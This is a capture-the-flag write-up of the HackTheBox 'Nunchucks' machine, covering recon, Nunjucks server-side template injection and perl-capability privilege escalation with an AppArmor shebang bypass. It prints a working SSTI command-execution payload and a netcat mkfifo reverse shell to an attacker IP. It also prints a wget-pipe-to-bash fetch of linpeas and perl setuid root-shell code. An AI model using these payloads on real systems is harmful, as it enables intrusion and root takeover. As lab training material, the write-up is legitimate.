---
title: HackTheBox - Nunchucks
published: true
---

## Summary

Nunchucks starts by enumerating a subdomain of the website that uses a node.js templating engine called nunjucks. We find we can use [SSTI](https://portswigger.net/research/server-side-template-injection) to get code execution on the server and from there get a reverse shell. With a foothold on the box we find perl has been given the [CAP_SETUID](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability. From there we find out we can exploit the SUID capability, even thought there is an AppArmour rule in place to limit it's use.

I enjoyed this easy box and used it as a chance to brush up on SSTI on a tempating engine I've not come across before. As well as a chance to learn about the AppArmour rule bypass which Im sure will come up again in the future.

## Initial Recon

We'll use Nmap to do a fast scan of all TCP ports.

```bash
nmap -p- 10.129.95.252 --min-rate 100000

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 12:11 GMT
Warning: 10.129.95.252 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.95.252
Host is up (0.028s latency).
Not shown: 60747 closed tcp ports (conn-refused), 4785 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Then we can use Nmap again, to do further in depth script and version scans of just the open ports found in the previous scan.

```bash
nmap -sC -sV -p22,80,443 -oN nunchucks-services.nmap 10.129.95.252
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 12:12 GMT
Nmap scan report for 10.129.95.252
Host is up (0.011s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_http-title: Nunchucks - Landing Page
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
```

Nmap found a hostname of `nunchucks.htb` in the SSL certificate, so we'll add that to our known hosts file.

```bash
sudo vim /etc/hosts

10.129.95.252 nunchucks.htb
```

Browsing to the site at `http://nunchucks.htb/` brings up an SSL Self Signed Certificate warning that we need to accept.

Only do this for CTF boxes as it can be a warning sign that something is wrong on a real site.

![HttpsIndexPage.png](assets/nunchucks_screenshots/HttpsIndexPage.png)

![HttpsSignUpPage.png](assets/nunchucks_screenshots/HttpsSignUpPage.png)

![HttpsLogInPage.png](assets/nunchucks_screenshots/HttpsLogInPage.png)

Tring to LogIn or SignUp dosen't send a request, it must be handled in javascript with the 'currently closed' message.

![HttpsSignUpClosed.png](assets/nunchucks_screenshots/HttpsSignUpClosed.png)

We notice at the bottom of the page a message with 'Store: Coming soon'

![HttpsStoreCommingSoon.png](assets/nunchucks_screenshots/HttpsStoreCommingSoon.png)

We can fuzz for vhosts with ffuf.

```bash
ffuf -u http://FUZZ.nunchucks.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

```txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.nunchucks.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

store                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 10ms]
:: Progress: [4989/4989] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:50] :: Errors: 4988 ::
```

As suspected we find a store subdomain, let's add this to our known hosts file.

```bash
sudo vim /etc/hosts

10.129.95.252 nunchucks.htb store.nunchucks.htb
```

Browsing to the store subdomain brings us to a news letter sign up page for the new store coming soon.

![HtppsStoreIndexPage.png](assets/nunchucks_screenshots/HtppsStoreIndexPage.png)

The notify box has a javascript filter requiring an email address. Until an email address is provided, no requests are sent.
Once we input an email address we can intercept the request in burp and change the post data. It is formatted as a json sting.

![HtppsStoreEmailFilter.png](assets/nunchucks_screenshots/HtppsStoreEmailFilter.png)

![HttpsBurpIntercept.png](assets/nunchucks_screenshots/HttpsBurpIntercept.png)

Sending an empty string with an extra double quote returns an error.
The error shows the web app is based on node.js.

![BurpError.png](assets/nunchucks_screenshots/BurpError.png)

## Nunjucks SSTI exploit

After trying multiple exploit payloads, such as common sql injection, csrf payloads, XSS, XXE, we find that the site is vulnerable to [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and will evaluate math.

{% raw %}

```js
{{7*7}}
${{7*7}}
```

{% endraw %}

![BurpSstiPayload.png](assets/nunchucks_screenshots/BurpSstiPayload.png)

Googling for `node template engine` takes us to [Express Template Engines](https://expressjs.com/en/resources/template-engines.html) where `Nunjucks` sticks out.

![ExpressTemplateEngines.png](assets/nunchucks_screenshots/ExpressTemplateEngines.png)

[Nunjucks](https://github.com/mozilla/nunjucks)

Googling for `nunjucks ssti` brings us to [Sandbox Breakout](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) which after some explaining givess us a payload to execute os commands.

![NunjucksOsCommandInjectionSSTI.png](assets/nunchucks_screenshots/NunjucksOsCommandInjectionSSTI.png)

We will use backslashes to escape the double quotes in the payload so that it plays nice with the json request.

{% raw %}

```js
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
```

{% endraw %}

![BurpSstiCodeExecution.png](assets/nunchucks_screenshots/BurpSstiCodeExecution.png)

Start a netcat listener

```bash
nc -lvnp 9001
```

Now we have code execution we'll try for a reverse shell.
Trying the usual suspects for reverse shell one liners, we eventualy land on the netcat temp file reverse shell.

{% raw %}

```json
{
    "email":"{{range.constructor(\"returnglobal.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 9001 >/tmp/f')\")()}}"
}
```

{% endraw %}

![BurpReverseShell.png](assets/nunchucks_screenshots/BurpReverseShell.png)

We can get a propper pty shell with the python trick.

```bash
$ nc -lvnp 9001
Connection from 10.129.95.252:57206
/bin/sh: 0: cant access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
david@nunchucks:/var/www/store.nunchucks$ ^Z
[1]  + 36614 suspended  nc -lvnp 9001

# tuz @ hackbox in ~ [15:16:56] C:148
$ stty raw -echo; fg
[1]  + 36614 continued  nc -lvnp 9001

david@nunchucks:/var/www/store.nunchucks$ export TERM=xterm
david@nunchucks:/var/www/store.nunchucks$
```

We can now grab the user flag.

![user_proof.png](assets/nunchucks_screenshots/user_proof.png)

## PrivEsc

After some basic manual enunmeration I decided to run [linpeas](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh) to save time.

We can download it to our attacker box, host it localy then download it on the victim.

Attacker

```bash
wget https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh && python -m http.server
```

Victim

```bash
wget -q -O - http://10.10.14.54/linpeas.sh | bash
```

Linpeas shows PERL has the setuid capability.

![LinpeasPerlSetuidCap.png](assets/nunchucks_screenshots/LinpeasPerlSetuidCap.png)

We could have found this manualy with `getcap`

```bash
getcap -r /
```

Knowing this, we can use [GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities) to show us how we can abuse the SUID capablities.

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

But that dosen't work here.
(note: we will investigate why once we have root.)

Let's insted look for perl scripts we might be able to abuse.

```bash
find / -name *.pl -ls 2>/dev/null
...snip...

151448      4 -rwxr-xr-x   1 root     root          838 Sep  1 12:53 /opt/backup.pl
```

We find a backup script in `/opt`.
Let's read the script.

```bash
cat /opt/backup.pl
```

```perl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid);
POSIX::setuid(0);

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

The script uses the setuid function.
Let's write our own script to call sh with the setuid bit set.

```bash
vim /dev/shm/suid_bash.pl
```

```perl
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"
```

Trying to call the script with perl still results in permision denied.

```bash
perl ~/suid_bash.pl
Cant open perl script "/home/david/suid_bash.pl": Permission denied
```

But chmod'ing the script to be executable, then running it works as intended.

```bash
chmod +x ~/suid_bash.pl
~/suid_bash.pl

id
uid=0(root) gid=1000(david) groups=1000(david)
```

![root_proof.png](assets/nunchucks_screenshots/root_proof.png)

## Post Root Invistergation into perl capabilities

This is weird, so we'll look into why this happens. The only reasons I can think of are:

- file system being mounted nosuid, but we ran it from a script so that doesn't make sense.
- SELinux or AppArmour security policies.

We'll double check the file system with mount first.

```bash
mount | grep 'nosuid'

sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,noexec,relatime,size=958032k,nr_inodes=239508,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=200640k,mode=755)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
none on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,nosuid,nodev,noexec,relatime)
tracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
configfs on /sys/kernel/config type configfs (rw,nosuid,nodev,noexec,relatime)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
```

There are no suid restrictions on the root of the file system `/home/david` where we're trying to call the script from, so it's definalty not that.
This might have been the case if we tried to run the script from `/dev/shm`, which is something to keep in mind.

Let's look into AppArmour next.
As root, we can check AppArmour status with `aa-status`

```bash
aa-status

apparmor module is loaded.
14 profiles are loaded.
14 profiles are in enforce mode.
   /usr/bin/man
   /usr/bin/perl
   /usr/lib/NetworkManager/nm-dhcp-client.action
   /usr/lib/NetworkManager/nm-dhcp-helper
   /usr/lib/connman/scripts/dhclient-script
   /usr/sbin/mysqld
   /usr/sbin/tcpdump
   /{,usr/}sbin/dhclient
   ippusbxd
   lsb_release
   man_filter
   man_groff
   nvidia_modprobe
   nvidia_modprobe//kmod
0 profiles are in complain mode.
2 processes have profiles defined.
2 processes are in enforce mode.
   /usr/sbin/mysqld (985)
   /usr/sbin/dhclient (708) /{,usr/}sbin/dhclient
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```

As suspected there is an AppArmour rule for perl. Let's look at it. AppArmour rules live in `/etc/apparmour.d/`

```bash
david@nunchucks:~$ ls -la /etc/apparmor.d/
total 72
drwxr-xr-x   7 root root  4096 Oct 28 17:03 .
drwxr-xr-x 125 root root 12288 Oct 29 13:26 ..
drwxr-xr-x   4 root root  4096 Oct 28 17:03 abstractions
drwxr-xr-x   2 root root  4096 Oct 28 17:03 disable
drwxr-xr-x   2 root root  4096 Oct 28 17:03 force-complain
drwxr-xr-x   2 root root  4096 Oct 28 17:03 local
-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r--   1 root root  3222 Mar 11  2020 sbin.dhclient
drwxr-xr-x   5 root root  4096 Oct 28 17:03 tunables
-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r--   1 root root   442 Sep 26 01:16 usr.bin.perl
-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r--   1 root root  2006 Jul 22 11:53 usr.sbin.mysqld
-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r--   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
```

```bash
cat /etc/apparmor.d/usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,
}
```

Googling `apparmor ignore script shebang` leads us to [AppArmour - Unable to prevent execution of shebang lines](https://bugs.launchpad.net/apparmor/+bug/1911431)

Apparently AppArmour ignores the path based rules when scripts have a shebang (i.e `#!/usr/bin/perl` ), which is why we can use our exploit from a script with a shebang, but not by invoking the perl interpreter directly. Another good point to keep in mind.
